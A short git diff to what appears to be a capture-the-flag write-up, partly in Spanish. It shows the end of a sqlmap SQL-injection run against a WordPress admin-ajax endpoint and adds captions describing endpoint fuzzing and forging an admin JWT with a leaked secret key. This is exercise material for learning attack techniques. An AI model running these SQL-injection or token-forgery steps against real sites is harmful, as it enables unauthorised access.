@@ -23,9 +23,12 @@ python sqlmap.py -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_q
 [20:20:00] [INFO] retrieved: 1
 [20:20:04] [INFO] retrieved: FLAG{Update_Plugins!}
 
-## FLAG_NAME_2
+## API_FLAG{Never_public_your_secret}
 
-Describe here the process to find the flag (you can include videos, images, etc)
+![Hacemos el fuzz para encontrar mas endpoints](./images/fuzz_1.jpg?raw=true)
+
+![cambiamos algunas cosas del token(user y le pinemos admin, y ponemos la JWT_SECRET_KEY](./images/token_admin.jpg?raw=true)
+
 
 ## FLAG_NAME_N
 
